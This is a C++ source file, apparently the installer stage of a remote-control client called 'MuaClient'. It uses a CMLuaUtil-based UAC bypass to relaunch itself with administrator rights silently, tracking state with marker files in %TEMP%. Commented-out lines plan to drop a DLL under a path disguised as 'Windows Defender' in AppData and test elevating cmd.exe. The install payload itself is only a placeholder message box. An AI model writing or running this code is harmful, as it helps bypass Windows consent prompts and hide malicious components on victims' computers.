// InstallMuaClient.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include "BypassUAC.h"


#include <windows.h> 
#include <shlobj.h>
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")





int main()
{
	// 创建互斥量
	HANDLE hMutex = CreateMutex(NULL, TRUE, L"EA102FF5-6BDA-41B3-BD42-028C03193095");
	WaitForSingleObject(hMutex, INFINITE);

	WCHAR pszWillBypassUAC[] = L"{70E92116-51A2-4538-8228-03EA82922FC2}";
	WCHAR pszInstallCompleted[] = L"{0DA3820B-5558-4849-A085-D07257C2775F}";

	// 安装早已完成，直接退出
	WCHAR pszTempPathInstallCompleted[MAX_PATH];
	GetTempPath(MAX_PATH, pszTempPathInstallCompleted);
	wcscat_s(pszTempPathInstallCompleted, pszInstallCompleted);
	if (PathFileExists(pszTempPathInstallCompleted)) {
		return -1;
	}

	WCHAR pszTempPathWillBypassUAC[MAX_PATH];
	GetTempPath(MAX_PATH, pszTempPathWillBypassUAC);
	wcscat_s(pszTempPathWillBypassUAC, pszWillBypassUAC);

	// 第一次，未提权
	if (!PathFileExists(pszTempPathWillBypassUAC)) {
		// 创建 %TEMP%\pszWillBypassUAC 文件，表示即将BypassUAC
		HANDLE hFile = CreateFile(pszTempPathWillBypassUAC, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != nullptr) {
			CloseHandle(hFile);
		}		

		// 本程序所在路径
		WCHAR pszThisProgramPath[MAX_PATH];
		GetModuleFileName(NULL, pszThisProgramPath, MAX_PATH);

		// 提权后再次运行此程序
		CMLuaUtilBypassUAC(pszThisProgramPath);
	}

	// 非第一次，已提权
	else {

		// install的代码
		MessageBox(0, L"sdfsdfs", L"", 0);
		
		//删掉这个用于表示BypassUAC的文件
		if (PathFileExists(pszTempPathWillBypassUAC)) {
			DeleteFile(pszTempPathWillBypassUAC);
		}
			
		// 这里暂时注释，等完成install的代码后，再解开注释
		//// 安装完了，创建 %TEMP%\pszInstallCompleted文件
		//HANDLE hFile = CreateFile(pszTempPathInstallCompleted, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		//if (hFile != nullptr) {
		//	CloseHandle(hFile);
		//}
	}

	// 释放互斥量
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	hMutex = nullptr;

	//WCHAR szBuffer[MAX_PATH];
	//SHGetSpecialFolderPath(NULL, szBuffer, CSIDL_APPDATA, FALSE);	// C:\Users\iyzyi\AppData\Roaming
	//wcscat_s(szBuffer, L"\\Windows Defender\\WindowsDefenderAutoUpload.dll");
	//MessageBox(0, szBuffer, L"", 0);
	

	//CMLuaUtilBypassUAC((LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
	//CMLuaUtilBypassUAC((LPWSTR)L"C:\\Users\\iyzyi\\Desktop\\WINDOWS黑客编程技术详解-配套代码\\用户层\\5\\系统服务\\AutoRun_Service_Test\\Debug\\AutoRun_Service_Test.exe");



	system("pause");
}